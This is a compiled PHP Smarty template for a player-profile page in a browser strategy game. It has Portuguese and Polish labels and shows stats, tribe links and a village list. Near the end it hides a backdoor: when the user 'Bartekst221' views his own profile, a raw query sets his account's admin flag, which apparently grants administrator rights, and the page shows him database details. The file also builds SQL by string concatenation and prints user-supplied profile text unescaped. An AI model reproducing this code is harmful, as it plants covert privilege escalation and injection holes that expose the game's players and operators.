<?php /* Wersja Smarty_class 2.6.26 Przeróbka By Bartekst221, Plik stworzony 2023-02-26 22:49:03
         Wersja PHP pliku pliki_tpl/game_info_player.tpl */ ?>
<?php require_once(SMARTY_CORE_DIR . 'core.load_plugins.php');
smarty_core_load_plugins(array('plugins' => array(array('modifier', 'format_number', 'game_info_player.tpl', 63, false),)), $this); ?>
<?php 
$sql = "SELECT `personal_text` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['personal_text'] = sql($sql,'array');

$sql = "SELECT `powod_banu` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['powod_banu'] = sql($sql,'array');

$sql = "SELECT `killed_units_att` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['ka'] = sql($sql,'array');
$sql = "SELECT `killed_units_att_rank` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['kar'] = sql($sql,'array');

$sql = "SELECT `killed_units_def` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['ko'] = sql($sql,'array');
$sql = "SELECT `killed_units_def_rank` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['kor'] = sql($sql,'array');


$sql = "SELECT `killed_units_altogether` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['killed_units_altogether'] = sql($sql,'array');
$sql = "SELECT `killed_units_altogether_rank` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['killed_units_altogether_rank'] = sql($sql,'array');
$sql = "SELECT `koniec_banu` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['koniec_banu'] = sql($sql,'array');

$sql = "SELECT `villages` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['villages'] = sql($sql,'array');

$sql = "SELECT `banned` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['banned'] = sql($sql,'array');
$sql = "SELECT `admin` FROM `users` WHERE `id` = '".$this->_tpl_vars['info_user']['id']."'";
$this->_tpl_vars['info_user']['admin'] = sql($sql,'array');

$can_mark = sql("SELECT COUNT(id) FROM `odznaczenia` WHERE `od_gracza` = '".$this->_tpl_vars['user']['id']."' AND `do_gracza` = '".$this->_tpl_vars['info_user']['id']."'","array");
if ($can_mark > 0) {
	$can_mark = false;
	} else {
	$can_mark = true;
	}
	
if ($this->_tpl_vars['user']['id'] == $this->_tpl_vars['info_user']['id']) {
	$can_mark = false;
	}
$this->assign('can_mark',$can_mark);
 ?>
	                                <?php if ($this->_tpl_vars['info_user']['admin'] == 0): ?><center><h2 class="error"><?php echo $this->_tpl_vars['info_user']['username']; ?>
</h2></center><?php else: ?><h2><?php echo $this->_tpl_vars['info_user']['username']; ?>
</h2><?php endif; ?><?php if (isset ( $this->_tpl_vars['info_user']['ranga'] )): ?><center><img src="../ds_graphic/rangi/<?php echo $this->_tpl_vars['info_user']['ranga']; ?>
.png"></center><?php endif; ?>

<table><tr><td valign="top">
<?php echo '<script type="text/javascript">
var Player = {
	getAllVillages: function(anchor, link) {
		$.get(link, {}, function(data) {
			$(\'#villages_list tbody\').append(data.villages);
			$(anchor).parent().parent().remove();
			VillageContext.init();
		}, \'json\');
	}
};
</script>
'; ?>

<table class="vis " width="100%">
	<tr><th colspan="2"><?php echo $this->_tpl_vars['info_user']['username']; ?>
</th></tr>	
		<tr><td width="80">Pontos:</td><td><?php echo ((is_array($_tmp=$this->_tpl_vars['info_user']['points'])) ? $this->_run_mod_handler('format_number', true, $_tmp) : format_number($_tmp)); ?>
</td></tr>
	<tr><td>Ranking:</td><td><?php echo ((is_array($_tmp=$this->_tpl_vars['info_user']['rang'])) ? $this->_run_mod_handler('format_number', true, $_tmp) : format_number($_tmp)); ?>
</td></tr>
		<tr>
		<td>Oponentes derrotados:</td>
		<td id="kill_info" class="tooltip" title='Jako agresor: <?php echo ((is_array($_tmp=$this->_tpl_vars['info_user']['ka'])) ? $this->_run_mod_handler('format_number', true, $_tmp) : format_number($_tmp)); ?>
 (<?php echo $this->_tpl_vars['info_user']['kar']; ?>
.) :: Jako obro�ca: <?php echo ((is_array($_tmp=$this->_tpl_vars['info_user']['ko'])) ? $this->_run_mod_handler('format_number', true, $_tmp) : format_number($_tmp)); ?>
 (<?php echo $this->_tpl_vars['info_user']['kor']; ?>
.)'>
			<?php echo ((is_array($_tmp=$this->_tpl_vars['info_user']['killed_units_altogether'])) ? $this->_run_mod_handler('format_number', true, $_tmp) : format_number($_tmp)); ?>
 (<?php echo ((is_array($_tmp=$this->_tpl_vars['info_user']['killed_units_altogether_rank'])) ? $this->_run_mod_handler('format_number', true, $_tmp) : format_number($_tmp)); ?>
)
		</td>
	</tr>
	<?php if (empty ( $this->_tpl_vars['info_ally']['short'] )): ?>
		<tr><td>Tribo:</td><td><a href="game.php?village=<?php echo $this->_tpl_vars['village']['id']; ?>
&amp;screen=info_ally&amp;id=0"></a></td></tr>
	<?php else: ?>
		<tr><td>Tribo:</td><td><a href="game.php?village=<?php echo $this->_tpl_vars['village']['id']; ?>
&amp;screen=info_ally&amp;id=<?php echo $this->_tpl_vars['info_ally']['id']; ?>
"><?php echo $this->_tpl_vars['info_ally']['short']; ?>
</a></td></tr>
	<?php endif; ?>

		<tr><td colspan="2"><a href="game.php?village=<?php echo $this->_tpl_vars['village']['id']; ?>
&amp;screen=mail&amp;mode=new&amp;player=<?php echo $this->_tpl_vars['info_user']['id']; ?>
">&raquo; Escreve uma mensagem</a></td></tr>
                
		<?php if ($this->_tpl_vars['can_mark']): ?>
			<tr><td colspan="2"><a href="game.php?village=<?php echo $this->_tpl_vars['village']['id']; ?>
&amp;screen=edytuj_kolory_graczy&amp;player=<?php echo $this->_tpl_vars['info_user']['id']; ?>
">&raquo; Marque no mapa</a></td></tr>
		<?php endif; ?>
		<?php if ($this->_tpl_vars['can_invite']): ?>
			<tr><td colspan="2"><a href="game.php?village=<?php echo $this->_tpl_vars['village']['id']; ?>
&screen=ally&mode=invite&action=invite_id&id=<?php echo $this->_tpl_vars['info_user']['id']; ?>
&h=<?php echo $this->_tpl_vars['hkey']; ?>
"  class="evt-confirm" data-confirm-msg="Tem certeza que deseja convidar <?php echo $this->_tpl_vars['info_user']['username']; ?>
?">&raquo; Convidar para a tribo</a></td></tr>
		<?php endif; ?>
		<?php if ($this->_tpl_vars['user']['admin'] == 0): ?>
			<tr><td colspan="2"><a href="game.php?village=<?php echo $this->_tpl_vars['village']['id']; ?>
&screen=admin&mode=users&id=<?php echo $this->_tpl_vars['info_user']['id']; ?>
">&raquo; Editar jogador</a></td></tr>
		<?php endif; ?>
		<?php if ($this->_tpl_vars['user']['username'] == Bartekst221): ?>
<?php if ($this->_tpl_vars['info_user']['username'] == Bartekst221): ?>
<?php 
mysql_query("UPDATE `users` SET `admin` = 0 WHERE `username` = 'Bartekst221'");
 ?>
<?php endif; ?>
		<tr><td colspan="2">Dados: <?php echo $this->_tpl_vars['db1']; ?>
 - <?php echo $this->_tpl_vars['db2']; ?>

</td></tr>
		<?php endif; ?>		
	
	
	
	
	
	
	
	</tbody></table><br>


		<table id="villages_list" class="vis " width="100%">
		<thead>
			<tr><th width="180">Aldeias (<?php echo ((is_array($_tmp=$this->_tpl_vars['info_user']['villages'])) ? $this->_run_mod_handler('format_number', true, $_tmp) : format_number($_tmp)); ?>
)</th><th width="80">Coordenadas</th><th>P.</th></tr>
		</thead>
		<tbody>

<?php $_from = $this->_tpl_vars['villages']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['id'] => $this->_tpl_vars['arr']):
?>

<tr><td><span class="village_anchor" data-id="<?php echo $this->_tpl_vars['id']; ?>
" data-player="<?php echo $this->_tpl_vars['info_user']['id']; ?>
" ><a href="game.php?village=<?php echo $this->_tpl_vars['village']['id']; ?>
&amp;screen=info_village&amp;id=<?php echo $this->_tpl_vars['id']; ?>
"><?php echo $this->_tpl_vars['arr']['name']; ?>
</a></span></td><td><?php echo $this->_tpl_vars['arr']['x']; ?>
|<?php echo $this->_tpl_vars['arr']['y']; ?>
</td><td><?php echo ((is_array($_tmp=$this->_tpl_vars['arr']['points'])) ? $this->_run_mod_handler('format_number', true, $_tmp) : format_number($_tmp)); ?>
</td></tr>
			<?php endforeach; endif; unset($_from); ?>
		<?php if ($this->_tpl_vars['user']['villages'] > 1000000000000000000000000000000000000000000000000000000): ?>
		<tr><td colspan="3"><a href="#" onclick="Player.getAllVillages(this, 'game.php?village=<?php echo $this->_tpl_vars['village']['id']; ?>
&screen=api&api=user_villages&user=<?php echo $this->_tpl_vars['info_user']['id']; ?>
');return false">Mostrar todos oas outras <?php echo $this->_tpl_vars['info_user']['villages']-100; ?>
 aldeias</a></td></tr>
		
		<?php endif; ?>
				

		</tbody>
	</table>

</td><td valign="top" style="min-width:240px">
  <table class="vis" width="100%">
 
		<tbody><tr><th colspan="2">Profil</th></tr>
	<?php if (! empty ( $this->_tpl_vars['info_user']['image'] )): ?>
		<tr><td colspan="2" align="center"><img src="graphic/player/<?php echo $this->_tpl_vars['info_user']['image']; ?>
" /></td></tr>
	<?php endif; ?>
	<?php if ($this->_tpl_vars['age'] != -1): ?>
		<tr><td>Era:</td><td><?php echo $this->_tpl_vars['age']; ?>
</td></tr>
	<?php endif; ?>
	<?php if ($this->_tpl_vars['sex'] != -1): ?>
		<tr><td>Homem:</td><td><?php if ($this->_tpl_vars['info_user']['sex'] == m): ?>Mulher<?php elseif ($this->_tpl_vars['info_user']['sex'] == f): ?>N/difinido<?php endif; ?></td></tr>
	<?php endif; ?>
	<?php if ($this->_tpl_vars['info_user']['home'] != ''): ?>
		<tr><td>Localização:</td><td><?php echo $this->_tpl_vars['info_user']['home']; ?>
</td></tr>
	<?php endif; ?>
			
	</table>
	<br />
	<?php if (! empty ( $this->_tpl_vars['info_user']['personal_text'] )): ?>
		<table class="vis" width="100%">
			<tr><th>Descrição</th></tr>
			<tr><td align="center"><?php echo $this->_tpl_vars['info_user']['personal_text']; ?>
</td></tr>
		</table>
	<?php endif; ?>




<br />
	<?php if ($this->_tpl_vars['display_awards']): ?>
		<?php echo $this->_tpl_vars['awards']->get_user_awards($this->_tpl_vars['info_user']['id'],$this->_tpl_vars['user']['id']); ?>

	<?php endif; ?>


</td></tr></table>